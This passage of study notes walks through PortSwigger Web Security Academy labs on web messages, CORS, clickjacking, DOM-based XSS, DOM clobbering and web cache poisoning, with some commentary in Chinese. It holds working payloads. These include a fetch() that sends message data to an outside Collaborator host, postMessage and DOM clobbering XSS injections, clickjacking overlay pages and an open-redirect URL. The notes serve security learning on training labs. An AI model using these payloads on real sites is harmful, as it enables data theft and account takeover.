        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://oc45i5yhmqkyayfg8skal62xioofc50u.oastify.com'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> event<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></p>
<ol type="1">
<li><p>in exploit server <img
src="https://s2.loli.net/2023/08/17/VBj5DUnlX846TKv.png"
alt="image-20230817045713355" /></p></li>
<li><p>click <code>view exploit</code></p></li>
<li><p>in burp collaborator: cick <code>poll</code></p>
<ol type="1">
<li>observe past message</li>
</ol></li>
<li><p>click <code>deliver exploit to victim</code></p>
<ol type="1">
<li>received more messages</li>
</ol></li>
</ol>
<h3 id="cross-origin-resource-sharing-cors">Cross-origin resource
sharing (CORS)</h3>
<h4 id="what-is-the-same-origin-policy">What is the same-origin
policy?</h4>
<ol type="1">
<li><p>example</p>
<table>
<colgroup>
<col style="width: 54%" />
<col style="width: 45%" />
</colgroup>
<thead>
<tr class="header">
<th>URL accessed</th>
<th>Access permitted?</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>http://normal-website.com/example/</code></td>
<td>Yes: same scheme, domain, and port</td>
</tr>
<tr class="even">
<td><code>http://normal-website.com/example2/</code></td>
<td>Yes: same scheme, domain, and port</td>
</tr>
<tr class="odd">
<td><code>https://normal-website.com/example/</code></td>
<td>No: different scheme and port</td>
</tr>
<tr class="even">
<td><code>http://en.normal-website.com/example/</code></td>
<td>No: different domain</td>
</tr>
<tr class="odd">
<td><code>http://www.normal-website.com/example/</code></td>
<td>No: different domain</td>
</tr>
<tr class="even">
<td><code>http://normal-website.com:8080/example/</code></td>
<td>No: different port*</td>
</tr>
</tbody>
</table></li>
</ol>
<h4 id="lab-cors-vulnerability-with-basic-origin-reflection">Lab: CORS
vulnerability with basic origin reflection</h4>
<ol type="1">
<li>notice that header
<code>Access-Control-Allow-Credentials: true</code><img
src="https://s2.loli.net/2023/08/20/dV2gjfnNae31RlL.png"
alt="image-20230820103305887" /></li>
<li>add this line: <img
src="https://s2.loli.net/2023/08/20/D2AUFZO3SLm4v9l.png"
alt="image-20230820103416209" /></li>
<li>craft exploit<img
src="https://s2.loli.net/2023/08/20/qDjdx7TK5k2QEXM.png"
alt="image-20230820103757657" /></li>
<li>check access log<img
src="https://s2.loli.net/2023/08/20/oBQlXhEZjqIFc5L.png"
alt="image-20230820103826679" /><img
src="https://s2.loli.net/2023/08/20/Ll8HNXCyzi5uUk9.png"
alt="image-20230820103836444" /></li>
</ol>
<h4 id="labcors-vulnerability-with-trusted-null-origin">Lab:CORS
vulnerability with trusted null origin</h4>
<ol type="1">
<li><code>Orgin:null</code><img
src="https://s2.loli.net/2023/08/20/UjRV7MuFzBSPWAs.png"
alt="image-20230820112506269" /></li>
<li>craft exploit: <img
src="https://s2.loli.net/2023/08/20/TDjfFL3kagJIBCN.png"
alt="image-20230820112853516" /></li>
</ol>
<h4 id="lab-cors-vulnerability-with-trusted-insecure-protocols">Lab:
CORS vulnerability with trusted insecure protocols</h4>
<ol type="1">
<li>Send the request to Burp Repeater, and resubmit it with the added
header <code>Origin: http://subdomain.lab-id</code> where
<code>lab-id</code> is the lab domain name.</li>
<li>Observe that the origin is reflected in the
<code>Access-Control-Allow-Origin</code> header, confirming that the
CORS configuration allows access from arbitrary subdomains, both HTTPS
and HTTP.</li>
<li>craft exploit<img
src="https://s2.loli.net/2023/08/20/w8LyzAMIPvxrmkb.png"
alt="image-20230820114706545" /></li>
</ol>
<h4 id="lab-cors-vulnerability-with-internal-network-pivot-attack">Lab:
CORS vulnerability with internal network pivot attack</h4>
<ol type="1">
<li>Attempting to obtain the <code>internal IP and port</code> of the
application<img src="https://s2.loli.net/2023/08/20/E4hglkC9Zvn1dzL.png"
alt="image-20230820180141838" /><img
src="https://s2.loli.net/2023/08/20/CnszVXkMYiw71pR.png" /></li>
<li>found xss vulnerbility<img
src="https://s2.loli.net/2023/08/20/zdiwFg9CTLbJ4vt.png" /><img
src="https://s2.loli.net/2023/08/20/Y2NPt41XdrUSfqi.png" /></li>
<li>Request the source code of the administrator page.<img
src="https://s2.loli.net/2023/08/20/kp1xIECMnoaz4Nb.png"
alt="image-20230820180757092" /><img
src="https://s2.loli.net/2023/08/20/qfcQHyG5mu81Lrt.png"
alt="image-20230820180826954" /></li>
<li>delete user:carlos<img
src="https://s2.loli.net/2023/08/20/2a4u9s8neDESY7h.png"
alt="image-20230820180906048" /></li>
</ol>
<h3 id="clickjacking-ui-redressing">Clickjacking (UI redressing)</h3>
<h4 id="lab-basic-clickjacking-with-csrf-token-protection">Lab: Basic
clickjacking with CSRF token protection</h4>
<ol type="1">
<li><p>forged webpage</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    <span class="token selector">iframe</span> <span class="token punctuation">&#123;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span>
        <span class="token property">opacity</span><span class="token punctuation">:</span> 0.1<span class="token punctuation">;</span>
        <span class="token property">z-index</span><span class="token punctuation">:</span> 2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>
        <span class="token property">left</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>
        <span class="token property">z-index</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Test me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a57003e03ff79e8802f08e0005100f5.web-security-academy.net/my-account<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre></li>
<li><p>Adjust the positional parameters to make 'delete account' and
'click me' overlap<img
src="https://s2.loli.net/2023/08/21/nEhacMrdi4zw7Ns.png"
alt="image-20230821102934756" /></p></li>
</ol>
<h4
id="lab-clickjacking-with-form-input-data-prefilled-from-a-url-parameter">Lab:
Clickjacking with form input data prefilled from a URL parameter</h4>
<ol type="1">
<li>craft exploit<img
src="https://s2.loli.net/2023/08/21/yWVziuDCLGXeZ26.png"
alt="image-20230821105014612" /></li>
</ol>
<h4 id="lab-clickjacking-with-a-frame-buster-script">Lab: Clickjacking
with a frame buster script</h4>
<ol type="1">
<li>craft exploit<img
src="https://s2.loli.net/2023/08/21/xbFV6rtmkW4a3P9.png"
alt="image-20230821113149671" /></li>
</ol>
<h4
id="lab-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss">Lab:
Exploiting clickjacking vulnerability to trigger DOM-based XSS</h4>
<ol type="1">
<li>craft exploit<img
src="https://s2.loli.net/2023/08/21/aqUfiAsPIEvzrgb.png"
alt="image-20230821114327786" /></li>
</ol>
<h4 id="multistep-clickjacking">Multistep clickjacking</h4>
<ol type="1">
<li>craft exploit<img
src="https://s2.loli.net/2023/08/21/3NvOrZa8E5DRQIM.png"
alt="image-20230821115726865" /></li>
</ol>
<h3 id="dom-based-vulnerabilities">DOM-based vulnerabilities</h3>
<ol type="1">
<li>The <code>Document Object Model (DOM)</code> is a web browser's
hierarchical representation of the elements on the page</li>
<li>DOM-based vulnerabilities arise when a website passes data
<code>from a source to a sink</code></li>
</ol>
<h4 id="dom-based-open-redirection">DOM-based open redirection</h4>
<ol type="1">
<li>DOM-based open-redirection vulnerabilities arise when a script
writes attacker-controllable data into a sink that can
<code>trigger cross-domain navigation</code>.</li>
</ol>
<h4 id="lab-dom-based-open-redirection">Lab: DOM-based open
redirection</h4>
<ol type="1">
<li><p>View Source Code<img
src="https://s2.loli.net/2023/08/21/95BFyhmHMSsUpQL.png"
alt="image-20230821155645322" /></p></li>
<li><p>这段代码是 HTML 中一个带有 <code>onclick</code>
事件的链接，存在开放重定向漏洞。</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>#<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript">returnURL <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">url=https?:\/\/.+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>returnUrl<span class="token punctuation">)</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> returnUrl<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">else</span> location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/"</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span>Back to Blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre>
<ol type="1">
<li><code>&lt;a href='#'</code>：这是一个链接标签，其中
<code>href='#'</code> 表示链接不会导致页面跳转到其他页面，而只是触发
<code>onclick</code> 事件。</li>
<li><code>onclick='...'</code>：这是链接的 <code>onclick</code>
事件处理程序，它包含一段 JavaScript 代码。</li>
<li><code>returnURL = /url=https?:\/\/.+)/.exec(location);</code>：这段代码尝试使用正则表达式来从当前页面的
URL 中提取一个以 "url=" 开头的参数，并将提取的内容赋值给名为
<code>returnURL</code> 的变量。</li>
<li><code>if(returnUrl)</code>：如果成功提取了 URL 参数，即
<code>returnURL</code> 不为空，则执行接下来的代码块。</li>
<li><code>location.href = returnUrl[1];</code>：这行代码将用户的浏览器重定向到
<code>returnURL</code> 中提取的 URL。</li>
<li><code>else location.href = "/";</code>：如果没有提取到 URL
参数，则将用户重定向到主页 "/".</li>
</ol></li>
<li><p>craft an exploit<img
src="https://s2.loli.net/2023/08/21/KaTuchEw6PJsqYe.png"
alt="image-20230821155929392" /></p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//0a98007c04bd4c9680201ccc00a500b1.web-security-academy.net/post?postId=4&amp;url=https://exploit-0a9c007604614c3c801a1bd0013e00e9.exploit-server.net/</span></span></code></pre></li>
</ol>
<h4 id="lab-dom-based-cookie-manipulation">Lab: DOM-based cookie
manipulation</h4>
<ol type="1">
<li><p>craft an exploit<img
src="https://s2.loli.net/2023/08/21/fiSGMwmvUcx3I2X.png"
alt="image-20230821162840307" /></p>
<p>这段代码涉及到一个基于客户端的攻击，主要是通过恶意构建的
<code>&lt;iframe&gt;</code> 元素和 <code>onload</code>
事件处理程序来实现：</p>
<ol type="1">
<li><strong>恶意构建 <code>&lt;iframe&gt;</code>
元素</strong>：攻击者创建一个 <code>&lt;iframe&gt;</code> 元素，并设置其
<code>src</code> 属性为一个 URL。在 URL
中，攻击者构造了一个恶意查询参数，如
<code>productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;</code>，这会在产品
ID 后注入一个恶意的 <code>&lt;script&gt;</code> 标签。</li>
<li><strong><code>onload</code> 事件处理程序</strong>：在
<code>&lt;iframe&gt;</code> 元素上设置了 <code>onload</code>
事件处理程序。当 <code>&lt;iframe&gt;</code>
的内容加载完成后，这个事件处理程序会触发执行。</li>
<li><strong>事件处理程序逻辑</strong>：<code>onload</code>
事件处理程序首先检查一个全局变量 <code>window.x</code>
是否已存在。如果不存在，它会将 <code>&lt;iframe&gt;</code> 的
<code>src</code> 属性重定向到另一个 URL（首页的 URL），并设置
<code>window.x</code> 为 1。</li>
<li><strong>攻击原理</strong>：当用户访问包含这个恶意构建的
<code>&lt;iframe&gt;</code> 元素的页面时，以下操作发生：
<ul>
<li><code>&lt;iframe&gt;</code> 加载开始，请求恶意构建的 URL。</li>
<li>恶意 URL 中的 <code>&lt;script&gt;</code> 标签（在这里是
<code>print()</code>）尝试执行。</li>
<li>页面中的 <code>onload</code> 事件处理程序触发，检查
<code>window.x</code> 是否存在。由于首次加载，<code>window.x</code>
不存在。</li>
<li><code>onload</code> 事件处理程序将 <code>&lt;iframe&gt;</code> 的
<code>src</code> 属性重定向到首页的 URL，并设置 <code>window.x</code> 为
1。</li>
<li>用户被重定向回首页。</li>
</ul></li>
<li><strong>攻击结果</strong>：用户看到的效果是，他们访问一个页面时，可能会暂时加载一个恶意
URL，然后立即被重定向回首页。这个过程可能导致浏览器记录一个恶意
URL，而且在用户访问首页时，<code>onload</code>
事件处理程序将会被触发，从而执行恶意脚本。</li>
</ol></li>
</ol>
<h4 id="dom-based-javascript-injection">DOM-based JavaScript
injection</h4>
<h4 id="dom-based-document-domain-manipulation">DOM-based
document-domain manipulation</h4>
<ol type="1">
<li>If two pages from different origins explicitly set the same
<code>document.domain</code> value, then those two pages can interact in
unrestricted ways</li>
</ol>
<h4 id="dom-based-websocket-url-poisoning">DOM-based WebSocket-URL
poisoning</h4>
<h4 id="dom-based-link-manipulation">DOM-based link manipulation</h4>
<h4 id="web-message-manipulation">Web message manipulation</h4>
<h4 id="dom-based-ajax-request-header-manipulation">DOM-based Ajax
request-header manipulation</h4>
<ol type="1">
<li>Using Ajax enables a website to make <code>asynchronous</code>
requests to the server so that web applications can dynamically change
content on the page <strong>without</strong> the need to reload the
entire page</li>
<li>Ajax request-header manipulation vulnerabilities arise when a script
writes attacker-controllable data into the <code>request header</code>
of an Ajax request that is issued using an <code>XmlHttpRequest</code>
object.</li>
</ol>
<h4 id="dom-based-local-file-path-manipulation">DOM-based local
file-path manipulation</h4>
<h4 id="dom-based-client-side-sql-injection">DOM-based client-side SQL
injection</h4>
<h4 id="dom-based-html5-storage-manipulation">DOM-based HTML5-storage
manipulation</h4>
<h4 id="dom-based-client-side-xpath-injection">DOM-based client-side
XPath injection</h4>
<h4 id="dom-based-client-side-json-injection">DOM-based client-side JSON
injection</h4>
<h4 id="dom-data-manipulation">DOM-data manipulation</h4>
<h4 id="dom-based-denial-of-service">DOM-based denial of service</h4>
<hr />
<ol type="1">
<li>an attacker could host a malicious <code>iframe</code> and use the
<code>postMessage()</code> method to pass web message data to the
vulnerable event listener,</li>
</ol>
<h4 id="lab-dom-xss-using-web-messages">Lab: DOM XSS using web
messages</h4>
<ol type="1">
<li><p>Notice that the home page contains an
<code>addEventListener()</code> call that listens for a web message.<img
src="https://s2.loli.net/2023/08/22/H3DScaIGkzNoOl6.png"
alt="image-20230822141102737" /></p>
<ol type="1">
<li><p><code>window.addEventListener('message', function(e) &#123; ... &#125;)</code>:
这是一个事件监听器，它监听 <code>message</code> 事件。当其他窗口或
iframe 发送一个 Web 消息时，这个事件监听器会被触发。</p></li>
<li><p><code>function(e) &#123; ... &#125;</code>:
这是一个回调函数，它接受一个事件对象
<code>e</code>，该事件对象包含了来自其他窗口发送的消息的信息。</p></li>
<li><p><code>document.getElementById('ads').innerHTML = e.data;</code>:
在事件监听器内部，它将从事件对象 <code>e</code> 中获取的消息内容
<code>e.data</code> 插入到页面中具有 ID 为 <code>'ads'</code>
的元素中。通常情况下，这个元素可能用于展示广告内容。</p></li>
</ol>
<p>在上述代码中，事件监听器接收到来自其他窗口或 iframe
的消息后，将消息的内容（<code>e.data</code>）直接插入到具有 ID 为
<code>'ads'</code> 的元素中，从而改变了 <code>'ads'</code>
元素的内容。然而，如果不对消息内容进行适当的验证和过滤，就可能导致恶意的消息被插入到页面中，从而执行攻击者的恶意代码。</p></li>
<li><p>craft an exploit</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a9d009a04d349e1846245e300aa00ee.web-security-academy.net/<span class="token punctuation">"</span></span>
    <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'&lt;img src=1 onerror=print()>'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h4 id="lab-dom-xss-using-web-messages-and-a-javascript-url">Lab: DOM
XSS using web messages and a JavaScript URL</h4>
<ol type="1">
<li><p>Notice that the home page contains an
<code>addEventListener()</code> call that listens for a web message<img
src="https://s2.loli.net/2023/08/22/eyB2ZlqVvQJprkR.png"
alt="image-20230822141951901" /></p>
<p>The JavaScript contains a flawed <code>indexOf()</code> check that
looks for the strings <code>"http:"</code> or <code>"https:"</code>
anywhere within the web message. It also contains the sink
<code>location.href</code>.</p></li>
<li><p>craft an exploit</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'javascript:print()//http:'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h4 id="lab-dom-xss-using-web-messages-and-json.parse">Lab: DOM XSS
using web messages and JSON.parse</h4>
<ol type="1">
<li><p>Home page js</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ACMEplayer <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">element</span><span class="token operator">:</span> iframe <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> d<span class="token punctuation">;</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        d <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>d<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token string">"page-load"</span><span class="token operator">:</span>
            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span><span class="token function">scrollIntoView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">"load-channel"</span><span class="token operator">:</span>
            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span>src <span class="token operator">=</span> d<span class="token punctuation">.</span>url<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">"player-height-changed"</span><span class="token operator">:</span>
            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> d<span class="token punctuation">.</span>width <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>
            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> d<span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>This event listener expects a string that is parsed using
<code>JSON.parse()</code>. In the JavaScript, we can see that the event
listener expects a <code>type</code> property and that the
<code>load-channel</code> case of the <code>switch</code> statement
changes the <code>iframe src</code> attribute.</p></li>
<li><p>craft an exploit</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>https://YOUR-LAB-ID.web-security-academy.net/</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"&#123;\"type\":\"load-channel\",\"url\":\"javascript:print()\"&#125;"</span><span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h4 id="dom-clobbering">DOM clobbering</h4>
<ol type="1">
<li>DOM clobbering is a technique in which you <code>inject HTML</code>
into a page to manipulate the DOM and ultimately <strong>change the
behavior</strong> of JavaScript on the page.</li>
<li>DOM clobbering is particularly useful in cases where <strong>XSS is
not possibl</strong>e, but you can control some HTML on a page where the
attributes <code>id</code> or <code>name</code> are whitelisted by the
HTML filter.</li>
</ol>
<h4 id="lab-exploiting-dom-clobbering-to-enable-xss">Lab: Exploiting DOM
clobbering to enable XSS</h4>
<ol type="1">
<li><p>Go to one of the blog posts and create a comment containing the
following anchors:</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultAvatar</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultAvatar</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>avatar</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cid:<span class="token entity named-entity" title="&quot;">&amp;quot;</span>onerror=alert(1)//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li>
<li><p>Return to the blog post and create a second comment containing
any random text. The next time the page loads, the <code>alert()</code>
is called.</p></li>
<li><p>The page for a specific blog post imports the JavaScript file
<code>loadCommentsWithDomPurify.js</code>, which contains the following
code:</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> defaultAvatar <span class="token operator">=</span> window<span class="token punctuation">.</span>defaultAvatar <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">'/resources/images/avatarDefault.svg'</span><span class="token punctuation">&#125;</span></code></pre>
<p>The <code>defaultAvatar</code> object is implemented using this
dangerous pattern containing the logical <code>OR</code> operator in
conjunction with a global variable. This makes it vulnerable to DOM
clobbering</p></li>
<li><p>Notice that the site uses the <code>DOMPurify</code> filter in an
attempt to reduce DOM-based vulnerabilities. However, DOMPurify allows
you to use the <code>cid: protocol</code>, which does not URL-encode
double-quotes. This means you can inject an encoded double-quote that
will be decoded at runtime. As a result, the injection described above
will cause the defaultAvatar variable to be assigned the clobbered
property <code>&#123;avatar: ‘cid:"onerror=alert(1)//’&#125;</code> the next time
the page is loaded.</p></li>
</ol>
<h4 id="lab-clobbering-dom-attributes-to-bypass-html-filters">Lab:
Clobbering DOM attributes to bypass HTML filters</h4>
<ol type="1">
<li><p>Go to one of the blog posts and create a comment containing the
following HTML:</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token attr-name">tabindex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>0</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>attributes</span><span class="token punctuation">></span></span></code></pre>
<p>The library uses the <code>attributes</code> property to filter HTML
attributes. However, it is still possible to clobber the
<code>attributes</code> property itself, causing the length to be
undefined. This allows us to inject any attributes we want into the
<code>form</code> element. In this case, we use the <code>onfocus</code>
attribute to smuggle the <code>print()</code> function.</p></li>
<li><p>Go to the exploit server and add the following
<code>iframe</code> to the body:</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">&lt;iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)"></code></pre>
<p>When the <code>iframe</code> is loaded, after a 500ms delay, it adds
the <code>#x</code> fragment to the end of the page URL. The delay is
necessary to make sure that the comment containing the injection is
loaded before the JavaScript is executed. This causes the browser to
focus on the element with the ID <code>"x"</code>, which is the form we
created inside the comment. The <code>onfocus</code> event handler then
calls the <code>print()</code> function.</p></li>
</ol>
<h3 id="web-cache-poisoning">Web cache poisoning</h3>
<h4 id="what-is-web-cache-poisoning">What is web cache poisoning?</h4>
<p>1.As with most kinds of attack, web cache poisoning can also be used
in <strong>combination</strong> with other attacks to
<code>escalate</code> the potential impact even further.</p>
<h4 id="identify-and-evaluate-unkeyed-inputs">Identify and evaluate
unkeyed inputs</h4>
<ol type="1">
<li>You can use tools such as <code>Burp Comparer</code> to compare the
response with and without the injected input, but this still involves a
significant amount of manual effort.</li>
<li>Fortunately, you can automate the process of identifying unkeyed
inputs by adding the <code>Param Miner extension</code> to Burp from the
BApp store</li>
</ol>
<h4 id="elicit-a-harmful-response-from-the-back-end-server">Elicit a
harmful response from the back-end server</h4>
<ol type="1">
<li>If an input is <code>reflected</code> in the response from the
server without being properly sanitized, or is used to dynamically
generate other data, then this is a potential entry point for web cache
poisoning.</li>
</ol>
<h4 id="get-the-response-cached">Get the response cached</h4>
<ol type="1">
<li>Whether or not a response gets cached can depend on <strong>all
kinds of factors</strong>, such as the file extension, content type,
route, status code, and response headers.</li>
</ol>
<hr />
<ol type="1">
<li>Some websites use unkeyed headers to <strong>dynamically generate
URLs</strong> for importing resources, such as externally hosted
JavaScript files.</li>
</ol>
<h4 id="lab-web-cache-poisoning-with-an-unkeyed-header">Lab: Web cache
poisoning with an unkeyed header</h4>
<ol type="1">
<li><strong>necessary</strong>:add a cache-buster query parameter.</li>
<li>first send request:<img
src="https://s2.loli.net/2023/08/26/wKcasBzxkgVJdmR.png"
alt="image-20230826145741061" />
<ol type="1">
<li>it's wrong: extra backslashes<img
src="https://s2.loli.net/2023/08/26/jQ5CHMJBwzbPgqF.png"
alt="image-20230826145937236" /></li>
</ol></li>
<li>exploit server body: <code>alert(document.cookie)</code></li>
<li>don't send requrest above again
untill:<code>X-Cache: hit</code></li>
</ol>
